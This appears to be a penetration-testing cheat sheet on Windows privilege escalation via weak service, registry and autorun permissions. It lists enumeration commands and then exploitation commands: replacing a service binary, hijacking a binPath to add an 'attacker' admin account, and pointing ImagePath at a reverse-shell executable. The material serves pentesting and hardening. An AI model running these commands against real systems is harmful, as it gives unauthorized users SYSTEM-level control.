### Summary

Weak permissions in the file system, services, registry, or autorun entries can be abused to escalate privileges. These are common in third-party software, misconfigured systems, or legacy setups. This technique involves finding services or executables that non-admin users can modify, then replacing or reconfiguring them to execute code as SYSTEM or Admin.
### Conditions

- Low-privileged access to the target system.   
- A service binary or configuration is modifiable by the current user.
- The misconfigured service runs as SYSTEM or an Admin-equivalent account.
### Enumeration

**Find modifiable binaries or services with SharpUp**

```powershell
.\SharpUp.exe audit
```

**Check permissions with `icacls`**

```powershell
icacls "C:\Path\To\Service.exe"
```

**Check service control permissions with AccessChk**

```cmd
accesschk.exe /accepteula -quvcw ServiceName
```

**Check registry permissions for services**

```cmd
accesschk.exe /accepteula <user> -kvuqsw hklm\System\CurrentControlSet\services
```

**Check autorun entries**

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
### Exploitation

**Service Binary Replacement**

```cmd
copy /Y malicious.exe "C:\Program Files (x86)\Target\service.exe"
sc start ServiceName
```

**Service BinPath Hijack**

```cmd
sc config ServiceName binpath= "cmd /c net localgroup administrators attacker /add"
sc stop ServiceName
sc start ServiceName
```

**Registry ImagePath Hijack**

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name "ImagePath" -Value "C:\attacker\reverse.exe"
```

**Abuse modifiable autorun binaries or registry keys**

- Replace binary at `C:\Users\victim\AppData\...`    
- Wait for reboot or user login
### Post-Exploitation

**Verify local admin**

```cmd
net localgroup administrators
```

**Clean up by reverting binpath**

```cmd
sc config ServiceName binpath= "C:\Original\Path\service.exe"
sc start ServiceName
```

# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Weak_service_permissions